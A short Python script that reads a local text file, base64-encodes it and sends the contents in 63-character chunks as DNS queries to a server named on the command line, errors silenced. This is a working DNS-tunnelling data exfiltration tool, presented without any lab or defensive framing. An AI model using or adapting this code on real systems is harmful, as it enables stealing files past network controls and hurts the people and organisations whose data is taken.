from dns import resolver
import base64
import sys


def send_dns_query(domain, dns_server):
    try:
        r = resolver.Resolver()
        r.nameservers = [dns_server]
        r.resolve(domain, 'A', lifetime=1)
    except:
        pass

def readTextFile():
    file_path = './text.txt'
    with open(file_path, 'r') as file:
        file_content = file.read()
    return file_content

def encodeBase64(content):
    content_bytes = content.encode('utf8')
    b64_content_bytes = base64.b64encode(content_bytes)
    return b64_content_bytes

def split_bytes(data, chunk_size):
    splitted_data = []
    for i in range(0, len(data), chunk_size):
        splitted_data.append(data[i:i+chunk_size])

    return splitted_data


if __name__ == '__main__':
    server_addr = sys.argv[1]

    print(f"Sending data to {server_addr}")

    file_content = readTextFile()
    b64Content = encodeBase64(file_content)

    splitted_bytes = split_bytes(b64Content, 63)

    for data in splitted_bytes:
        decoded_string = data.decode('utf-8')
        send_dns_query(decoded_string, server_addr)

    